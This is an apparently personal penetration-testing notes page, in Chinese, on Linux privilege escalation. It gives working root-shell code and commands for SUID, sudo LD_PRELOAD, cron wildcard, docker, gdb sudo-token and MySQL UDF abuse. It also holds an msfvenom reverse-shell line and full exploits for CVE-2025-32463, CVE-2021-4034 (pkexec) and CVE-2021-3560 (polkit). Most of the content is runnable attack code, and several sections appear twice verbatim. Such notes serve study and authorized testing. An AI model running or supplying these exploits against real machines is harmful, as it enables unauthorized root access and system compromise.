---
title: "格式"
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: "格式"
tags: ["渗透"]
---
## SUID/SGID
## SUID/SGID

```sh
find / -perm -4000 -type f 2>/dev/null
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null
```


只对二进制文件生效，对shell脚本无效

可以setuid、setgid之后执行bash
可以setuid、setgid之后执行bash
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){
        setuid(0);
        setgid(0);
        system("/bin/bash -i");
}
```

### 链接库劫持
如果看到哪个奇怪的程序有suid，追踪链接库，如果哪个没有找到，且目录可写，就可以实现劫持

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

### 路径劫持
当suid进程执行了另一个进程时，如果用相对路径，可以设置 PATH=.:$PATH
如果用绝对路径，看看bash版本是否 `<4.2-048`，如果是，可以
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
导出类似绝对路径的函数，从而劫持命令

### bash debug
bash < 4.4, 当某个suid进程使用了setuid(0), 并执行bash时，环境变量被传入bash
高版本不继承PS4
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

### 链接库劫持
如果看到哪个奇怪的程序有suid，追踪链接库，如果哪个没有找到，且目录可写，就可以实现劫持

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

### 路径劫持
当suid进程执行了另一个进程时，如果用相对路径，可以设置 PATH=.:$PATH
如果用绝对路径，看看bash版本是否 `<4.2-048`，如果是，可以
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
导出类似绝对路径的函数，从而劫持命令

### bash debug
bash < 4.4, 当某个suid进程使用了setuid(0), 并执行bash时，环境变量被传入bash
高版本不继承PS4
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

## sudoers配置提权
`/etc/sudoers.d/`下的文件（不以`~`结尾, 不包含`.`）可以配置某些命令使用sudo不需要密码。比如下述配置。
```
mekrina@candy tmp $ cat /etc/sudoers.d/add_ip
mekrina ALL=(ALL) NOPASSWD: /home/mekrina/myScript/shell/add_ip.sh
# 格式
# <user> <host> = (<runas-users>[:<runas-groups>]) <tags>: <command list>
# 格式
# <user> <host> = (<runas-users>[:<runas-groups>]) <tags>: <command list>
```
执行`/home/mekrina/myScript/shell/add_ip.sh`不需要密码。
如果该文件当前用户有编辑权限，很容易就能实现提权
或者这个文件不存在了，那么新建一个文件也可以实现提权

看配置里的env_keep有没有危险环境变量，比如LD_PRELOAD，添加了这个选项之后，执行root权限的命令不会自动删掉这个变量，从而实现提权

### env_keep+=LD_PRELOAD
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
__attribute__ ((__constructor__)) void preload (void){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

```bash
gcc -shared -fPIC -o test.so test.c
sudo LD_PRELOAD=/tmp/test.so apache2
```
这个apache2命令首先也得是NO_PASSWD，因为是验证之后才会加载链接库

### env_keep+=LD_LIBRARY_PATH

```bash
ldd /usr/sbin/apache2
mv 1.so ...
sudo LD_LIBRARY_PATH=/tmp apache2
```

## 定时任务
/etc/crontab
/etc/cron*
crontab -l
/var/spool/cron/crontabs

pspy监控进程

看：
### 可以修改的脚本或删除替换的文件
### 路径劫持
使用相对路径的时候，看看PATH中有没有在比较靠前位置且可写的

### 通配符
通过创建带`--...`的文件，给命令设置额外参数
比如tar，可以用 --checkpoint=1 --checkpoint-action=exec=/bin/sh
但这样拿不到shell，用msf创一个反弹shell的二进制

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell.elf`

## copyfail
`algif_aead`能被加载
```
modprobe --dry-run --verbose algif_aead
```

如果是insmod或者空（已经被加载），则没有被临时修复

或者看是否是内核内建（=y）
```
zgrep CONFIG_CRYPTO_USER_API_AEAD /proc/config.gz
```


影响内核版本：
```txt
floor:    torvalds/linux 72548b093ee3   August 2017, v4.14
                                        (AF_ALG iov_iter rework that
                                         introduced the file-page write
                                         primitive via splice into the AEAD
                                         scatterlist)

ceiling:  torvalds/linux a664bf3d603d   April 2026, mainline
                                        (reverts the 2017 algif_aead
                                         in-place optimization; separates
                                         source and destination scatterlists
                                         so page-cache pages can no longer
                                         be a writable crypto destination)
```
## Dirty Frag
验证：
```
modprobe -n -v rxrpc
modprobe -n -v esp4
// modprobe -n -v esp6 应该也行

看是否是内核内建：
zgrep -E 'CONFIG_INET_ESP|CONFIG_IPV6_ESP|CONFIG_AF_RXRPC' /proc/config.gz
```

copy fail共享一个sink点，但不受algif_aead约束
有两条链可以选：
1. xfrm-ESP Page-Cache Write 2017年引入
通过user namespace提升到root，不一定可用，unshare经常默认被禁用，比如docker中，seccomp、apparmor配置

2. RxRPC Page-Cache Write 2023年引入

## cap_setuid
```bash
getcap -r / 2>/dev/null
```
`/home/karen/vim = cap_setuid+ep`, 说明可以setuid(0)
```python
import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

## /etc/passwd | etc/shadow 权限错误
/etc/passwd 或 /etc/shadow 可写时
把x替换成密码哈希
```bash
mkpasswd -m sha-512 123456
```
当 /etc/shadow 可读时爆破

```bash
john --format=crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## docker用户组提权

拥有docker权限相当于拥有root权限

docker run -it --rm --privileged --pid=host alpine[|ubuntu] nsenter -t 1 -m -u -n -i sh

nsenter用于切换进程命名空间，然后就相当于在主机中执行命令了

在挂载了主机docker.sock的容器中，相当于拥有了主机的docker权限，也相当于拥有主机root权限，一样的方式执行主机命令。需要--privileged参数启动。

## NFS no_root_squash
网络共享文件夹，`no_root_squash` 表示不去除root权限，可以设置suid，然后执行
```bash
cat /etc/exports
showmount -e [ip] # 为空列出本机
```

## ssh
看看ssh里面有没有登录其他用户的

## 令牌劫持
### 原理
当`/proc/sys/kernel/yama/ptrace_scope`为0时，允许gdb附加到任何同用户进程
如果有一个用户在另一个shell中执行了sudo命令，并输入了密码。在令牌有效期间使用gdp附加到该shell进程，可以无密码使用sudo，实现权限提升

```sh
gdb -p <pid>
```

```gdb
call system("sudo id > /tmp/res")
```

写入`/etc/sudoers`，可以持久化
```sh
Defaults !tty_tickets
Defaults timestamp_timeout=-1
```
或者通过拷贝sh文件，并设置suid持久化
```
sudo cp -p /bin/sh /tmp/
sudo chmod +s /tmp/sh

/tmp/sh -p 
```
这里必须用-p参数才能获得root权限

![](assets/linux提权/Pasted%20image%2020260329162817.png)

/proc/sys/kernel/yama/ptrace_scope

### exp
一般用exploit_v2.sh即可，然后执行 `/tmp/sh -p`，-p是允许shell以特权模式启动


## CVE-2025-32463 sudo漏洞提权
影响范围 `1.9.14<=sudo<1.9.17p1`

sudo 默认有suid，执行sudo其实就是以root权限运行了，只不过需要密码验证才会执行后续的命令
```bash
mekrina@candy woot $ ls /bin/sudo -l
-rwsr-xr-x 1 root root 277936 Jun 25  2025 /bin/sudo
```

PoC如下

```bash
#!/bin/bash
# CVE-2025-32463 漏洞利用脚本
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)  # 创建临时工作目录
cd ${STAGE?} || exit 1

# 编写恶意NSS动态库代码
cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0, 0);  // 设置用户ID为root
  setregid(0, 0);  // 设置组ID为root
  chdir("/");      // 切换到根目录
  execl("/bin/bash", "/bin/bash", NULL);  // 启动root shell
}
EOF

# 构造chroot环境目录结构
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf  # 指定加载恶意NSS库
cp /etc/group woot/etc  # 复制系统group文件，避免解析错误

# 编译恶意动态库（生成libnss_woot1337.so.2）
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

# 执行漏洞利用（-R指定chroot目录为woot，命令woot可不存在）
echo "触发漏洞..."
sudo -R woot woot

# 清理临时文件（若提权成功，需手动清理）
# rm -rf ${STAGE?}
```

原理是 chroot 先于权限验证，chroot到一个用户自定义的文件夹下，后续sudo就会读到用户伪造的nsswitch.conf, 然后加载libnss_/woot1337.so.2，从而获得root的bash

## CVE-2021-4034 pkexec

### 原理
pkexec是polkit的前端程序，有suid，可以用来执行高权限命令，正常情况下需要输密码。

漏洞在遍历参数后，对 `argv[n]`进行赋值，导致越界写。当没有参数，n=1的时候，`argv[1]`其实恰好指向了`evnp[0]`，导致了任意环境变量添加。可以添加一个加载so文件的环境变量（正常情况下pkexec执行前会删除这些环境变量），从而以高权限执行任意命令

### exp
pkexec --version < 0.120
详见工具 pwnkit-exploit

```c
#include <unistd.h>
#include <stdio.h>

int main()
{
    /* The argv and environment passed to pkexec, the basis of this
     * exploit */
    char *argv[] = {NULL};

    char *envp[] = {
        "gconv",                /* path containing malicious gconv config/shared obj */
        "PATH=GCONV_PATH=.",    /* Environment variable to be injected */
        "CHARSET=ZT",           /* Charset defined in malicious gconv config */
        "SHELL=fakeshell",      /* Invalid shell value, triggers error to be printed, resulting in charset conversion */
        "GIO_USE_VFS=",             /* GIO_USE_VFS must be unset on versions of pkexec that set it. */
        NULL};

    fprintf(stderr, "Running exploit...\n");

    /* Run pkexec! */
    int ret = execve("/usr/bin/pkexec", argv, envp);
    if (ret)
        perror("pkexec");

    return -1;
}
```

执行了这段代码就会设置GCONV_PATH=.，从而去加载./gconv下的指定.so文件，从而拿到root

```c
#include <gconv.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

/* This function is executed as root */
void payload()
{
    char *argv[] = {"/bin/sh", NULL};
    uid_t uid;

    uid = getuid();
    fprintf(stderr, "After exploit, your UID is %d\n", uid);
    fprintf(stderr, "Running shell:\n\n");
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    execv(argv[0], argv);
}

/* Called upon shared object loading by glibc. */
int gconv_init (struct __gconv_step *step)
{
    /* Run this process and subprocesses as root */
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    /* Execute payload */
    payload();

    return __GCONV_OK;
}

/*
 * glibc checks for this function when loading the shared object. It
 * is never called, but if it does not exist, an assertion fails.
 */
int gconv(struct __gconv_step *step)
{
    return __GCONV_OK;
}
```



## CVE-2021-3560 polkit dbus

### 原理
该漏洞主要存在于 **polkit 0.113 到 0.118** 版本之间。以下发行版镜像通常包含易受攻击的版本：

apt list --installed | grep policykit-1

`0.105-26ubuntu1.1` 这个版本patched

![](assets/linux提权/Pasted%20image%2020260329110407.png)

polkit是用于身份认证的服务，dbus-send请求添加新用户，后面polkit会询问它的UID，如果这期间dbus-send进程被杀死，会默认UID是0，从而可以添加高权限用户。

![](assets/linux提权/Pasted%20image%2020260328213359.png)

### exp
自动化见 pentest/escalation
先看一下需要多长时间，看real。要卡在dbus-send之后，验证之前 kill
```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```

比如0.009，可以设置0.005或尝试其他的

创建用户 mekrina
```sh
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:mekrina string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

设置密码`mekrina`，uid要是刚刚创建的用户的
```sh
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$3U8p02lSnK7mpHDQ$.WYwJhgpo9X8cyBA2iZbnGGPW28lBuwu/RQWtv4lpwID4tpyFGj8CtglJCugAgPaoXDUHZ9WHloe0Ql3I5ZO5.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

## mysql提权
searchsploit里面找到tar（32bit）或`linux/local/1518.c`（自己编译，有说明）

```sql
show variables like '%plugin%';
show variables like 'secure%'; # 为空最好，为NULL不能写

use mysql;   
create table foo(line blob);   
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));   
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   
create function do_system returns integer soname 'raptor_udf2.so';
select do_system("cp /bin/bash /tmp/; chmod +xs /tmp/bash");

/tmp/bash -p
```
## mysql提权
searchsploit里面找到tar（32bit）或`linux/local/1518.c`（自己编译，有说明）

```sql
show variables like '%plugin%';
show variables like 'secure%'; # 为空最好，为NULL不能写

use mysql;   
create table foo(line blob);   
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));   
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   
create function do_system returns integer soname 'raptor_udf2.so';
select do_system("cp /bin/bash /tmp/; chmod +xs /tmp/bash");

/tmp/bash -p
```